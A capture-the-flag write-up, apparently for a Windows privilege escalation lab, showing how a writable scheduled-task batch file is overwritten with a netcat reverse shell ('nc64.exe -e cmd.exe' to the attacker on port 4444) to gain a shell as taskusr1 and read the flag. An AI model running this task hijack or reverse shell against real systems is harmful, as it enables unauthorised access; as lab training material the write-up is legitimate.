## Exercises

### Question 1 — What is the taskusr1 flag?

I started by looking for the `vulntask` scheduled task to confirm which user it ran as, filtering the full output down to the line mentioning `taskusr1`:

```powershell
PS C:\Users\thm-unpriv> schtasks /query /v /fo list | Select-String "taskusr1" -Context 20,0

  Folder: \
  HostName:                             WPRIVESC1
  TaskName:                             \vulntask
  Next Run Time:                        N/A
  Status:                               Ready
  Logon Mode:                           Interactive/Background
  Last Run Time:                        11/12/2026 1:04:25 PM
  Last Result:                          0
  Author:                               WPRIVESC1\Administrator
  Task To Run:                          C:\tasks\schtask.bat
  Start In:                             N/A
  Comment:                              N/A
  Scheduled Task State:                 Enabled
  Idle Time:                            Disabled
  Power Management:                     Stop On Battery Mode, No Start On Batteries
> Run As User:                          taskusr1
```

**Breakdown:**

- `schtasks /query` lists information about scheduled tasks
- `/v` requests verbose output, showing every field for each task rather than a brief summary
- `/fo list` formats the output as a list rather than a table
- `|` pipes that output into the next command
- `Select-String "taskusr1"` searches the piped text for lines containing `taskusr1`
- `-Context 20,0` includes 20 lines of context **before** each match and 0 lines **after**, so the whole task's block of fields is shown leading up to the matching line (marked with `>`)

That confirmed a task called `vulntask` runs as `taskusr1`. I then queried that specific task directly to see its full detail in one place, rather than filtering:

```powershell
PS C:\Users\thm-unpriv> schtasks /query /v /fo list /tn vulntask

Folder: \
```

**Breakdown:**

- `schtasks /query /v /fo list` — same as above: verbose, list-formatted query
- `/tn vulntask` restricts the query to the single task named `vulntask`, instead of listing every scheduled task on the system

This confirmed two things: the task runs the binary at `C:\tasks\schtask.bat`, and it runs as `taskusr1`. Next I checked the permissions on that `.bat` file:

```cmd
C:\tasks\schtask.bat BUILTIN\Users:(I)(F)
                     NT AUTHORITY\SYSTEM:(I)(F)
                     BUILTIN\Administrators:(I)(F)

Successfully processed 1 files; Failed processing 0 files
```

`BUILTIN\Users` has `(F)` — Full Control — over the file. Since my own account falls under that group, I could freely overwrite the script the task runs.

Before touching the file, I set up a listener on my attacking machine to catch the shell once the task fired:

```shell
┌──(—REDACTED—㉿kali)-[~]
└─$ nc -lvnp 4444

listening on [any] 4444 ...
```

**Breakdown:**

- `nc` is netcat
- `-l` puts netcat into listen mode, waiting for an incoming connection instead of initiating one
- `-v` enables verbose output, so connection events are printed
- `-n` skips DNS resolution on incoming connections, listing the connecting IP numerically rather than trying to resolve a hostname
- `-p 4444` sets the local port to listen on

With the listener running, I overwrote `schtask.bat` with a one-line reverse shell payload:

```cmd
C:\Users\thm-unpriv>echo C:\tools\nc64.exe -e cmd.exe —REDACTED— 4444 > C:\tasks\schtask.bat

C:\Users\thm-unpriv>type C:\tasks\schtask.bat
C:\tools\nc64.exe -e cmd.exe —REDACTED— 4444
```

**Breakdown:**

- `echo C:\tools\nc64.exe -e cmd.exe —REDACTED— 4444` prints that command text — `nc64.exe` (the Windows netcat binary already provided on the box) connecting out to `—REDACTED—` on port `4444` and, via `-e cmd.exe`, handing over an interactive `cmd.exe` shell through that connection
- `> C:\tasks\schtask.bat` redirects the echoed text into the task's script file, overwriting its previous contents
- `type C:\tasks\schtask.bat` reads the file back to confirm the overwrite landed correctly — it had

With the payload in place, I triggered the task manually rather than waiting for its actual schedule:

```cmd
C:\Users\thm-unpriv>schtasks /run /tn vulntask

SUCCESS: Attempted to run the scheduled task "vulntask".
```

- `schtasks /run` starts a scheduled task immediately
- `/tn vulntask` specifies which task to start

The listener caught the connection straight away, running as `taskusr1`:

```shell
┌──(—REDACTED—㉿kali)-[~]
└─$ nc -lvnp 4444

listening on [any] 4444 ...
connect to [—REDACTED—] from (UNKNOWN) [10.112.162.83] 49949
Microsoft Windows [Version 10.0.17763.1821]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
wprivesc1\taskusr1
```

With a shell as `taskusr1`, I didn't know offhand where the flag would be, so I searched the whole `C:\` drive for it by filename rather than guessing the path:

```cmd
C:\Windows\system32>where /R C:\ flag.txt
where /R C:\ flag.txt

C:\Users\taskusr1\Desktop\flag.txt
```

**Breakdown:**

- `where` locates files matching a given pattern
- `/R C:\` searches recursively, starting from the root of `C:\`, rather than only the current directory
- `flag.txt` is the filename being searched for

That turned up the flag on `taskusr1`'s own desktop, which I then read:

```cmd
C:\Windows\system32>type C:\Users\taskusr1\Desktop\flag.txt
type C:\Users\taskusr1\Desktop\flag.txt

—REDACTED—
```
